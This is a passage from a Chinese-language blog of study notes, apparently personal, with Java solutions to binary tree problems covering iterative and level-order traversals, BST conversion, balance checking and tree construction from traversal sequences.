class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h2><h3 id="迭代遍历"><a href="#迭代遍历" class="headerlink" title="迭代遍历"></a>迭代遍历</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//前序遍历</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">preorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> list;</span><br><span class="line">        &#125;</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        stack.push(root);</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">p</span>  <span class="operator">=</span> root;</span><br><span class="line">        <span class="keyword">while</span>(!stack.isEmpty())&#123;</span><br><span class="line">            p = stack.pop();</span><br><span class="line">            list.add(p.val);</span><br><span class="line">            <span class="comment">//注意这里需要的是先压入右节点，因为栈是先进后出</span></span><br><span class="line">            <span class="keyword">if</span>(p.right!=<span class="literal">null</span>)&#123;</span><br><span class="line">                stack.push(p.right);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(p.left!=<span class="literal">null</span>)&#123;</span><br><span class="line">                stack.push(p.left);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//中序遍历</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="comment">// List&lt;Integer&gt; list = new ArrayList&lt;&gt;();</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">inorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line"></span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> list;</span><br><span class="line">        &#125;</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">p</span> <span class="operator">=</span> root;</span><br><span class="line">        <span class="keyword">while</span>(!stack.isEmpty()||p!=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(p!=<span class="literal">null</span>)&#123;</span><br><span class="line">                stack.push(p);</span><br><span class="line">                p = p.left;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                p = stack.pop();</span><br><span class="line">                list.add(p.val);</span><br><span class="line">                p = p.right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//后续遍历</span></span><br><span class="line"><span class="comment">//后续遍历可以由前序遍历反转得到（中右左反转）    前序：中左右 ，后序：左右中</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">postorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> list;</span><br><span class="line">        &#125;</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        stack.push(root);</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">p</span> <span class="operator">=</span> root;</span><br><span class="line">        <span class="keyword">while</span>(!stack.isEmpty())&#123;</span><br><span class="line">            p = stack.pop();</span><br><span class="line">            list.add(p.val);</span><br><span class="line">            <span class="keyword">if</span>(p.left!=<span class="literal">null</span>)&#123;</span><br><span class="line">                stack.push(p.left);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(p.right!=<span class="literal">null</span>)&#123;</span><br><span class="line">                stack.push(p.right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Collections.reverse(list);</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="统一写法"><a href="#统一写法" class="headerlink" title="统一写法"></a>统一写法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">preorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; result = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        Stack&lt;TreeNode&gt; st = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="literal">null</span>) st.push(root);</span><br><span class="line">        <span class="keyword">while</span> (!st.empty()) &#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> st.peek();</span><br><span class="line">            <span class="keyword">if</span> (node != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">//其中各种遍历的变化就是这里，</span></span><br><span class="line">                </span><br><span class="line">                st.pop(); <span class="comment">// 将该节点弹出，避免重复操作，下面再将右中左节点添加到栈中</span></span><br><span class="line">                <span class="keyword">if</span> (node.right!=<span class="literal">null</span>) st.push(node.right);  <span class="comment">// 添加右节点（空节点不入栈）</span></span><br><span class="line">                <span class="keyword">if</span> (node.left!=<span class="literal">null</span>) st.push(node.left);    <span class="comment">// 添加左节点（空节点不入栈）</span></span><br><span class="line">                st.push(node);                          <span class="comment">// 添加中节点</span></span><br><span class="line">                st.push(<span class="literal">null</span>); <span class="comment">// 中节点访问过，但是还没有处理，加入空节点做为标记。</span></span><br><span class="line">                </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123; <span class="comment">// 只有遇到空节点的时候，才将下一个节点放进结果集</span></span><br><span class="line">                st.pop();           <span class="comment">// 将空节点弹出</span></span><br><span class="line">                node = st.peek();    <span class="comment">// 重新取出栈中元素</span></span><br><span class="line">                st.pop();</span><br><span class="line">                result.add(node.val); <span class="comment">// 加入到结果集</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="层次遍历"><a href="#层次遍历" class="headerlink" title="层次遍历"></a>层次遍历</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">levelOrder</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line"></span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> list;</span><br><span class="line">        &#125;</span><br><span class="line">        Deque&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        queue.offer(root);</span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">            <span class="comment">//基本的固定模板</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> queue.size();</span><br><span class="line">            List&lt;Integer&gt; temp = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">            <span class="keyword">while</span>(size&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">                temp.add(node.val);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(node.left!=<span class="literal">null</span>)&#123;</span><br><span class="line">                    queue.offer(node.left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(node.right!=<span class="literal">null</span>)&#123;</span><br><span class="line">                    queue.offer(node.right);</span><br><span class="line">                &#125;</span><br><span class="line">                size--;</span><br><span class="line">            &#125;</span><br><span class="line">            list.add(temp);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<p>循环，并且</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//需要知道当前层次</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">KthNode</span> <span class="params">(TreeNode proot, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    <span class="keyword">if</span>(proot==<span class="literal">null</span>||k&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">    stack.push(proot);</span><br><span class="line">    <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> proot;</span><br><span class="line">    <span class="keyword">while</span>(!stack.isEmpty())&#123;</span><br><span class="line">        <span class="keyword">while</span>(node.left!=<span class="literal">null</span>)&#123;</span><br><span class="line">            stack.push(node.left);</span><br><span class="line">            node = node.left; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//如果，这里写成 node = stack.pop()是会出错的。因为，左子树遍历结束之后需要遍历右子树，只有右子树不为空，node才会变，否则便是一直为空，便会一直会进入上面的循环里面（node.left!=null）</span></span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">temp</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">        count++;</span><br><span class="line">        <span class="keyword">if</span>(count == k)&#123;</span><br><span class="line">            <span class="keyword">return</span> temp.val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(temp.right!=<span class="literal">null</span>)&#123;</span><br><span class="line">            stack.push(temp.right);</span><br><span class="line">            node = temp.right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//如果不需要知道当前层次，就很简单</span></span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *   int val = 0;</span></span><br><span class="line"><span class="comment"> *   TreeNode left = null;</span></span><br><span class="line"><span class="comment"> *   TreeNode right = null;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lowestCommonAncestor</span> <span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        queue.add(root);</span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">            <span class="keyword">if</span>(node.left!=<span class="literal">null</span>)&#123;</span><br><span class="line">                queue.add(node.left);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(node.right!=<span class="literal">null</span>)&#123;</span><br><span class="line">                queue.add(node.right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>二叉搜索树：中序遍历构造双指针链表</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    TreeNode pre ;</span><br><span class="line">    TreeNode root;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">Convert</span><span class="params">(TreeNode pRootOfTree)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(pRootOfTree==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//左节点</span></span><br><span class="line">        Convert(pRootOfTree.left);</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">//找到头节点，可以用这种方法来给某个特定的节点赋值，而不怕在递归的过程中改变。</span></span><br><span class="line">            root = pRootOfTree;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(pre!=<span class="literal">null</span>)&#123;</span><br><span class="line">            pre.right = pRootOfTree;</span><br><span class="line">            pRootOfTree.left = pre;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        pre = pRootOfTree;</span><br><span class="line">        <span class="comment">//右节点</span></span><br><span class="line">        Convert(pRootOfTree.right);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>找到给定节点中序遍历的下一个节点 JZ8：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    </span><br><span class="line">    TreeLinkNode next;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> TreeLinkNode <span class="title function_">GetNext</span><span class="params">(TreeLinkNode pNode)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(pNode==<span class="literal">null</span>||pNode.right==<span class="literal">null</span>&amp;&amp;pNode.left==<span class="literal">null</span>&amp;&amp;pNode.next==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//该节点存在右子树，则中序遍历的下一个节点就是右子树的最左孩子节点</span></span><br><span class="line">        <span class="keyword">if</span>(pNode.right!=<span class="literal">null</span>)&#123;</span><br><span class="line">            pNode = pNode.right;</span><br><span class="line">            <span class="keyword">while</span>(pNode.left!=<span class="literal">null</span>)&#123;</span><br><span class="line">                pNode = pNode.left;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> pNode;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//如果不存在右子树，则下一个节点就是该节点的第一个右父节点</span></span><br><span class="line">        <span class="comment">//右代表的是这个节点的位于右父节点的左边。</span></span><br><span class="line">        <span class="keyword">while</span>(pNode.next!=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(pNode.next.left == pNode)&#123;</span><br><span class="line">                <span class="keyword">return</span> pNode.next;</span><br><span class="line">            &#125;</span><br><span class="line">            pNode = pNode.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="判断平衡二叉树"><a href="#判断平衡二叉树" class="headerlink" title="判断平衡二叉树"></a>判断平衡二叉树</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">import</span> java.lang.Math;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isBalanced</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> getHeight(root)==-<span class="number">1</span>?<span class="literal">false</span>:<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getHeight</span><span class="params">(TreeNode root)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">leftHeight</span> <span class="operator">=</span> getHeight(root.left);</span><br><span class="line">        <span class="keyword">if</span>(leftHeight==-<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">rightHeight</span> <span class="operator">=</span> getHeight(root.right);</span><br><span class="line">        <span class="keyword">if</span>(rightHeight==-<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//如果左子树的 高度与右子树的高度差大于1，则说明不是平很二叉树，返回-1，如果是的话，返回该数的高度</span></span><br><span class="line">        <span class="keyword">return</span> Math.abs(leftHeight-rightHeight)&gt;<span class="number">1</span>?-<span class="number">1</span>:<span class="number">1</span> + Math.max(leftHeight,rightHeight);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="构造二叉树"><a href="#构造二叉树" class="headerlink" title="构造二叉树"></a>构造二叉树</h2><p>注意分割区间的时候需要统一，比如全部规定为左闭右开，就可以极大提高正确率，不用一直 调试</p>
<h3 id="前序遍历-中序遍历构造二叉树：JZ7，看不懂"><a href="#前序遍历-中序遍历构造二叉树：JZ7，看不懂" class="headerlink" title="前序遍历+中序遍历构造二叉树：JZ7，看不懂"></a>前序遍历+中序遍历构造二叉树：JZ7，看不懂</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//递归</span></span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">reConstructBinaryTree</span><span class="params">(<span class="type">int</span> [] pre,<span class="type">int</span> [] vin)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(pre.length!=vin.length)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dfs(pre,<span class="number">0</span>,vin,<span class="number">0</span>,vin.length);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">dfs</span><span class="params">(<span class="type">int</span>[]pre, <span class="type">int</span> preStart,<span class="type">int</span>[] vin, <span class="type">int</span> vinStart,<span class="type">int</span> vinEnd)</span>&#123;</span><br><span class="line">         <span class="keyword">if</span>(preStart&gt;pre.length-<span class="number">1</span>||vinStart&gt;vinEnd)&#123;</span><br><span class="line">             <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">         &#125; </span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="keyword">for</span>( i = vinStart;i&lt;=vinEnd;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(pre[preStart] == vin[i])&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//以I为中心，分别构造左孩子节点和右孩子节点</span></span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(pre[preStart]);</span><br><span class="line">        <span class="comment">//关键是要分清楚左孩的节点数和右孩子的节点数，这个关系到了前序遍历节点位置开始的地方</span></span><br><span class="line">        node.left = dfs(pre,preStart+<span class="number">1</span>,vin,vinStart,i-<span class="number">1</span>);</span><br><span class="line">        node.right = dfs(pre,preStart+i-vinStart+<span class="number">1</span>,vin,i+<span class="number">1</span>,vinEnd);</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *注意不要写错了，还有一点，前序+中序的时候，前序可以不要后一个点的区间</span></span><br><span class="line"><span class="comment"> 同理，后序加中序也是一样，需要注意结束条件</span></span><br><span class="line"><span class="comment"> 但是建议还是四个节点，要好一点</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">buildTree</span><span class="params">(<span class="type">int</span>[] preorder, <span class="type">int</span>[] inorder)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> buildTree(preorder,<span class="number">0</span>,preorder.length,inorder,<span class="number">0</span>,inorder.length);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> TreeNode <span class="title function_">buildTree</span><span class="params">(<span class="type">int</span>[] preorder,<span class="type">int</span> startPreorder,<span class="type">int</span> endPreorder,<span class="type">int</span>[]inorder,<span class="type">int</span> startInorder,<span class="type">int</span> endInorder)</span>&#123;</span><br><span class="line">        <span class="comment">//因为是更具前序序列来遍历的</span></span><br><span class="line">        <span class="comment">//前序序列来逐个建立节点</span></span><br><span class="line">        <span class="comment">//基本这里都是这个条件来退出递归</span></span><br><span class="line">        <span class="keyword">if</span>(startPreorder==endPreorder)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">rootValue</span> <span class="operator">=</span> preorder[startPreorder];</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(rootValue);</span><br><span class="line">        <span class="type">int</span> i=startInorder;</span><br><span class="line">        <span class="keyword">for</span>(;i&lt;endInorder;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(inorder[i]==rootValue)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//开始分割</span></span><br><span class="line">        <span class="comment">//前序序列分割为：[startPreorder+1,startPreorder+i-startInorder+1)</span></span><br><span class="line">        <span class="comment">//[startPreorder+i-startInorder+1,endPreorder)</span></span><br><span class="line">        <span class="comment">//zhong续序列分割为：[startInorder,i),[i+1,endInorder]</span></span><br><span class="line"></span><br><span class="line">        root.left = buildTree(preorder,startPreorder+<span class="number">1</span>,startPreorder+<span class="number">1</span>+i-startInorder,inorder,startInorder,i);</span><br><span class="line">        root.right = buildTree(preorder,startPreorder+<span class="number">1</span>+i-startInorder,endPreorder,inorder,i+<span class="number">1</span>,endInorder);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="中序加后续构造二叉树"><a href="#中序加后续构造二叉树" class="headerlink" title="中序加后续构造二叉树"></a>中序加后续构造二叉树</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//主要是更具后续遍历的最后一个节点来切割中序</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">buildTree</span><span class="params">(<span class="type">int</span>[] inorder, <span class="type">int</span>[] postorder)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(inorder.length==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> buildTree(inorder,<span class="number">0</span>,inorder.length,postorder,<span class="number">0</span>,postorder.length);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> TreeNode <span class="title function_">buildTree</span><span class="params">(<span class="type">int</span>[] inorder,<span class="type">int</span> startInorder,<span class="type">int</span> endInorder,<span class="type">int</span>[]postorder,<span class="type">int</span> startPoster,<span class="type">int</span> endPoster)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(startPoster==endPoster)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">rootValue</span> <span class="operator">=</span>  postorder[endPoster-<span class="number">1</span>];</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(rootValue);</span><br><span class="line">        <span class="comment">//在中序中找到切割点 i </span></span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> startInorder;</span><br><span class="line">        <span class="keyword">for</span>(;i&lt;endInorder;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(inorder[i]==rootValue)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//进行左闭右开的规则， 分割后的中序：[startInorder,i) [i+1,endInorder);</span></span><br><span class="line">        <span class="comment">//分割后的后续，左后续的长度和分割后的中序的长度是一样的</span></span><br><span class="line">        <span class="comment">//[startPoster,startPoster + i-startInorder）[startPoster + i-startInorder,endPoster-1）</span></span><br><span class="line"></span><br><span class="line">        root.left = buildTree(inorder,startInorder,i,postorder,startPoster,startPoster+i-startInorder);</span><br><span class="line">        root.right = buildTree(inorder,i+<span class="number">1</span>,endInorder,postorder,startPoster+i-startInorder,endPoster-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



